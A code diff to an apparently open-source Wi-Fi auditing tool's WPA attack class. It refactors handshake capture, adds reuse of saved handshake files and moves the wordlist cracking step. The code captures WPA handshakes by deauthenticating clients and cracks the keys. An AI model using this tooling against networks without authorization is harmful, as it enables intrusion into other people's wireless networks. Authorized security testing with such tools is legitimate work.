@@ -34,6 +34,35 @@ class AttackWPA(Attack):
             self.success = False
             return self.success
 
+        handshake = None
+
+        # Capture the handshake ("do it live!")
+        if handshake is None:
+            handshake = self.capture_handshake()
+
+        if handshake is None:
+            # Failed to capture handshake
+            self.success = False
+            return self.success
+
+        # Analyze handshake
+        Color.pl('\n{+} analysis of captured handshake file:')
+        handshake.analyze()
+
+        # Crack it
+        key = self.crack_handshake(handshake, Configuration.wordlist)
+        if key is None:
+            self.success = False
+        else:
+            self.crack_result = CrackResultWPA(bssid, essid, handshake.capfile, key)
+            self.crack_result.dump()
+            self.success = True
+        return self.success
+
+    def capture_handshake(self):
+        ''' Returns captured or stored handshake, otherwise None '''
+        handshake = None
+
         # First, start Airodump process
         with Airodump(channel=self.target.channel,
                       target_bssid=self.target.bssid,
@@ -46,7 +75,17 @@ class AttackWPA(Attack):
 
             self.clients = []
 
-            handshake = None
+            bssid = airodump_target.bssid
+            essid = airodump_target.essid if airodump_target.essid_known else None
+
+            # Try to load existing handshake
+            if Configuration.ignore_old_handshakes == False:
+                handshake = self.load_handshake(bssid=bssid, essid=essid)
+                if handshake:
+                    Color.clear_entire_line()
+                    Color.pl('{+} found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
+                    Color.pl('{+} from {C}%s{W}' % handshake.capfile)
+                    return handshake
 
             timeout_timer = Timer(Configuration.wpa_attack_timeout)
             deauth_timer = Timer(Configuration.wpa_deauth_timeout)
@@ -107,28 +146,14 @@ class AttackWPA(Attack):
                 time.sleep(step_timer.remaining())
                 continue # Handshake listen+deauth loop
 
-            if not handshake:
-                # No handshake, attack failed.
-                Color.pl("\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds" % (Configuration.wpa_attack_timeout))
-                self.success = False
-                return self.success
-
+        if handshake is None:
+            # No handshake, attack failed.
+            Color.pl("\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds" % (Configuration.wpa_attack_timeout))
+            return handshake
+        else:
             # Save copy of handshake to ./hs/
             self.save_handshake(handshake)
-
-            # Print analysis of handshake file
-            Color.pl('\n{+} analysis of captured handshake file:')
-            handshake.analyze()
-
-            # Try to crack handshake
-            key = self.crack_handshake(handshake, Configuration.wordlist)
-            if key is None:
-                self.success = False
-            else:
-                self.crack_result = CrackResultWPA(bssid, essid, handshake.capfile, key)
-                self.crack_result.dump()
-                self.success = True
-            return self.success
+            return handshake
 
     def crack_handshake(self, handshake, wordlist):
         '''Tries to crack a handshake. Returns WPA key if found, otherwise None.'''
@@ -200,6 +225,24 @@ class AttackWPA(Attack):
                      " {O}%s{R} did not contain password{W}" % wordlist.split(os.sep)[-1])
             return None
 
+    def load_handshake(self, bssid, essid):
+        if not os.path.exists(Configuration.wpa_handshake_dir):
+            return None
+
+        if essid:
+            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
+        else:
+            essid_safe = '[a-zA-Z0-9]+'
+        bssid_safe = re.escape(bssid.replace(':', '-'))
+        date = '\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
+        get_filename = re.compile('handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))
+
+        for filename in os.listdir(Configuration.wpa_handshake_dir):
+            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
+            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
+                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)
+
+        return None
 
     def save_handshake(self, handshake):
         '''
